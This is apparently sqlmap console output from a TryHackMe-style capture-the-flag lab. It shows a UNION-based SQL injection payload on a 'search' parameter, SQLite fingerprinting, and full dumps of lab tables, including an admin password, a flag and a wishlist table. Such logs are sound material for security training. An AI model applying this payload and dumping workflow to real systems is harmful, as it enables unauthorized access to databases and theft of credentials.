        ___
       __H__
 ___ ___[(]_____ ___ ___  {1.5.6#stable}
|_ -| . [)]     | .'| . |
|___|_  [,]_|_|_|__,|  _|
      |_|V...       |_|   http://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 19:40:35 /2021-06-23/

[19:40:35] [INFO] parsing HTTP request from 'burp_out'
[19:40:35] [INFO] loading tamper module 'space2comment'
[19:40:35] [INFO] testing connection to the target URL
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: search (GET)
    Type: UNION query
    Title: Generic UNION query (NULL) - 2 columns
    Payload: search=f' UNION ALL SELECT NULL,CHAR(113,112,112,107,113)||CHAR(122,80,66,97,82,66,86,80,81,69,122,122,76,114,98,70,76,110,72,120,118,118,73,111,119,81,70,72,115,84,66,122,79,81,107,107,103,74,73,98)||CHAR(113,98,106,98,113)-- TKZX
---
[19:40:36] [WARNING] changes made by tampering scripts are not included in shown payload content(s)
[19:40:36] [INFO] testing SQLite
[19:40:36] [INFO] confirming SQLite
[19:40:36] [INFO] actively fingerprinting SQLite
[19:40:36] [INFO] the back-end DBMS is SQLite
back-end DBMS: SQLite
[19:40:36] [INFO] sqlmap will dump entries of all tables from all databases now
[19:40:36] [INFO] fetching tables for database: 'SQLite_masterdb'
[19:40:36] [INFO] fetching columns for table 'users' 
[19:40:36] [INFO] fetching entries for table 'users'
Database: <current>
Table: users
[1 entry]
+------------------+----------+
| password         | username |
+------------------+----------+
| EhCNSWzzFP6sc7gB | admin    |
+------------------+----------+

[19:40:36] [INFO] table 'SQLite_masterdb.users' dumped to CSV file '/home/kali/.local/share/sqlmap/output/10.10.145.52/dump/SQLite_masterdb/users.csv'
[19:40:36] [INFO] fetching columns for table 'hidden_table' 
[19:40:36] [INFO] fetching entries for table 'hidden_table'
Database: <current>
Table: hidden_table
[1 entry]
+-----------------------------------------+
| flag                                    |
+-----------------------------------------+
| thmfox{All_I_Want_for_Christmas_Is_You} |
+-----------------------------------------+

[19:40:36] [INFO] table 'SQLite_masterdb.hidden_table' dumped to CSV file '/home/kali/.local/share/sqlmap/output/10.10.145.52/dump/SQLite_masterdb/hidden_table.csv'
[19:40:36] [INFO] fetching columns for table 'sequels' 
[19:40:36] [INFO] fetching entries for table 'sequels'
Database: <current>
Table: sequels
[22 entries]
+-------------+-----+----------------------------+
| kid         | age | title                      |
+-------------+-----+----------------------------+
| James       | 8   | shoes                      |
| John        | 4   | skateboard                 |
| Robert      | 17  | iphone                     |
| Michael     | 5   | playstation                |
| William     | 6   | xbox                       |
| David       | 6   | candy                      |
| Richard     | 9   | books                      |
| Joseph      | 7   | socks                      |
| Thomas      | 10  | 10 McDonalds meals         |
| Charles     | 3   | toy car                    |
| Christopher | 8   | air hockey table           |
| Daniel      | 12  | lego star wars             |
| Matthew     | 15  | bike                       |
| Anthony     | 3   | table tennis               |
| Donald      | 4   | fazer chocolate            |
| Mark        | 17  | wii                        |
| Paul        | 9   | github ownership           |
| James       | 8   | finnish-english dictionary |
| Steven      | 11  | laptop                     |
| Andrew      | 16  | rasberry pie               |
| Kenneth     | 19  | TryHackMe Sub              |
| Joshua      | 12  | chair                      |
+-------------+-----+----------------------------+

[19:40:36] [INFO] table 'SQLite_masterdb.sequels' dumped to CSV file '/home/kali/.local/share/sqlmap/output/10.10.145.52/dump/SQLite_masterdb/sequels.csv'
[19:40:36] [INFO] fetched data logged to text files under '/home/kali/.local/share/sqlmap/output/10.10.145.52'

[*] ending @ 19:40:36 /2021-06-23/

